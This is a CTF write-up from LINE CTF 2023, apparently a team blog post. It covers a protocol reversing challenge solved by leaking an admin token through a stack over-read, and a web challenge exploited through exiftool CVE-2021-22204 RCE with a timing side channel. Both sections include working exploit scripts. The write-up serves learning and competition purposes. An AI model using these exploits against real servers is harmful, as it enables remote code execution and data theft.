---
title: "LINE CTF 2023"
date: "2023-03-25"
tags: ["CTF", "LINE", "jeopardy"]
---

# Pwn

## Simple blogger

This was the simpler pwnable of the CTF (and the only we solved 😢). It featured a client-server application based on a custom protocol, with the aim of allowing an authenticated admin to store and read messages.

We can execute the provided client to get an idea of what the server offers by looking at its menu:

```
Welcome to a simple blogger!!!

Commands (type a number):
[1] Print this `help` message.
[2] Show the banner.
[3] Ping.
[4] Login.
[5] Logout.
[6] Read a message.
[7] Write a message.
[8] Flag.
[9] Exit program.

CONSOLE>
```

The first two commands are just client-side utilities, but the others correspond to commands on the server.

### Figuring out the protocol

We started by reverse engineering the protocol that the server and client were running. To do it, we used a mix of mostly Ghidra and a little bit of Wireshark (to confirm some intuitions). After a while, we figured the following format:

```
0               8
+---------------+
|    version    |
+---------------+
|    command    |
+---------------+
|   auth token  |
|               |
+---------------+
|  payload len  |
|  (big endian) |
+---------------+
|               |
|               |
|               |
|               |
|    payload    |
|  (1024 bytes) |
|               |
|               |
|               |
|               |
|               |
+---------------+

```

Version was always equal to byte `01`, and commands were given as bytes ranging from `01` to `06` (in the same order as in the client's menu).
It took a while to reverse it all as the server was using a custom calling convention (basically passing the payload length and payload through the stack).

### Finding the vulnerability

After reversing every server function, we were stuck for a bit trying to find a vulnerability. Every single function but ping was locked under authentication, as we were out of credentials.
After playing with it for a while, we tried to simply send a ping message (the only one we are authorized to send), but sending a bigger payload length than the real one. The answer from the server actually included a lot more data than only the expected `PONG` response!

Looking at Ghidra provided the reason. Note that, when copying on the `msg->data` (the response message) the response data (`PONG`) it uses `msg->len`, which is set to the payload length sent by us.

![](/images/simple_blogger_ping_vulnerability.png)

This allows us to read some of the stack of the program! If we look really closely, we can also notice something else: to implement the admin cleanup function, a token is needed. However, the token is taken from our request, but it is taken from the database and it is saved on the stack. Due to the stack layout, right after the `PONG` response there is the admin token that we need to read the flag.

We can finally get the flag with the following script:

```py
#!/usr/bin/env python3

from pwn import *

HOST = "34.146.54.86"
PORT = 10007

exe = ELF("./server_patched")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]
io = None


def conn(*a, **kw):
    if args.LOCAL:
        return process([exe.path], env={"LD_LIBRARY_PATH": "."}, **kw)
    elif args.GDB:
        return gdb.debug([exe.path], env={"LD_LIBRARY_PATH": "."}, gdbscript="", **kw)
    else:
        return remote(HOST, PORT, **kw)


def msg(command, length, data, session=b"\x00" * 16, version=1):
    assert len(session) == 16
    return p8(version) + p8(command) + session + p16(length, endian="big") + data


def main():
    global io
    io = conn(level="debug")

    # good luck pwning :)
    data = b"PING"
    io.send(msg(1, 0x400, data))  # ping with fake payload length
    io.recv(8)
    token = io.recv(16)

    io.send(msg(6, 0, b"", session=token))  # get flag

    io.interactive()


if __name__ == "__main__":
    main()

```

# Web

## Imagexif

This challenge featured a ~~simple~~ web server written in flask that uses `exiftool` to provide information about an uploaded image. Jinja2 is used to serve html pages, but no SSTI there for today. Instead, after poking and reading the code for a while we noticed something in the Dockerfile:

```dockerfile
FROM python:3.11.2

RUN apt-get update

RUN apt-get install -y curl wget && \
    DEBIAN_FRONTEND="noninteractive"         && \
    echo done

RUN wget https://github.com/exiftool/exiftool/archive/refs/tags/12.22.tar.gz && \
    tar xvf 12.22.tar.gz && \
    cp -fr /exiftool-12.22/* /usr/bin && \
    rm -rf /exiftool-12.22 && \
    rm 12.22.tar.gz

ADD ./src /src/
ADD ./conf /conf/

WORKDIR /src

COPY uwsgi.ini .

RUN addgroup --gid 1000 appuser && \
    useradd --uid 1000 --gid 1000 -r -s /bin/false appuser

RUN find /src -type d -exec chmod 755 {} + && \
    find /src -type f -exec chmod 644 {} + && \
    find /src -type f -exec chattr +i {} \; && \
    find /src/tmp -type d -exec chmod 777 {} + && \
    find /src/*.sh -exec chmod +x {} \;

RUN apt-get install -y tzdata && \
    cp /usr/share/zoneinfo/Asia/Tokyo /etc/localtime && \
    echo "Asia/Tokyo" > /etc/timezone

RUN python3.11 -m pip install -r requirements.txt
RUN python3.11 -m pip install uwsgi
RUN apt-get purge -y curl wget

RUN ln -sf /bin/bash /bin/sh

CMD ["uwsgi", "uwsgi.ini"]

RUN chmod o-x /usr/local/bin/python3.11 && \
    rm /usr/lib/x86_64-linux-gnu/perl-base/socket.pm
```

The Dockerfile downloads a slightly outdated version of `exiftool`. From other CTFs, we know that `exiftool` had some problems in the past, so we looked around for CVEs related to this version. With little surprise, we found that this version is vulnerable to [CVE-2021-22204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204), allowing a quite simple RCE. After quickly getting an PoC exploit from [this repo](https://github.com/UNICORDev/exploit-CVE-2021-22204), we got the flag... or so we thought.

There is a catch: the backend container is completely isolated from external networks, so no reverse shell, curl, or DNS exfiltration here! We decided to use a side-channel: time (e.g. `sleep`). Fairly enough, we can find a utility script already on the backend that allows to convert a character to its ASCII (decimal) representation. We also knew that flag letters only included hexadecimal digits, making it easier to optimize the side-channel.
The following is the script used to extract the flag with success. Notice that we could not use some characters (e.g. parenthesis), making the scripting part a little more frustrating. The final script is fairly fast and reliable:

```py
#!/usr/bin/env python

import os
import requests
import time

flag = "LINECTF{"
#       LINECTF{2a38211e3b4da95326f5ab593d0af0e9}
i = len(flag)
while True:
    print(flag)

    # This command will:
    #  - save into X the ascii value of the i-th character of the flag
    #  - sleep for $X - 87 seconds, which may mean not sleeping (if character is in 0-9),
    #    where 87 is ord('a') - 10, so that characters in a-f will cause a sleep from 10 to 16 seconds
    #  - if previous sleep failed, sleep for $X - 48 seconds, where 48 is ord('0'), meaning that
    #    we will sleep from 0 to 9 seconds for characters in 0-9
    #
    # TL;DR;
    #  - sleep >= 10 -> a-f
    #  - sleep < 10 -> 0-9
    cmd = (
        "X=`/src/ascii.sh ${FLAG:%d:1}`; sleep `expr $X - 87` || sleep `expr $X - 48`"
        % i
    )
    print(cmd)

    # Craft the image using a CVE PoC found online
    # Download the exploit from here, or do it by hand
    # https://github.com/UNICORDev/exploit-CVE-2021-22204
    os.system(f"python ./cve-2021-22204.py -c '{cmd}'")

    # Send a request computing the time. We will use time to exfiltrate a single character
    # of the flag at a time
    start = time.time()
    r = requests.post(
        "http://34.85.58.100:11008/upload", files={"file": open("./image.jpg", "rb")}
    )
    end = time.time()
    elapsed = end - start

    # Check if we got a match with one of our expected characters.
    # It may happen that this script fails (finds the wrong letter) due to network latency,
    # but it did not happen in practice
    print(f"Elapsed: {elapsed}")
    try:
        char = "0123456789abcdef"[int(elapsed)]
        print(f"Found: {char}")
        if char in "1234567890abcdef}":
            flag += char
    except:
        flag += "?"
        print("Rejected!")
    i += 1
```
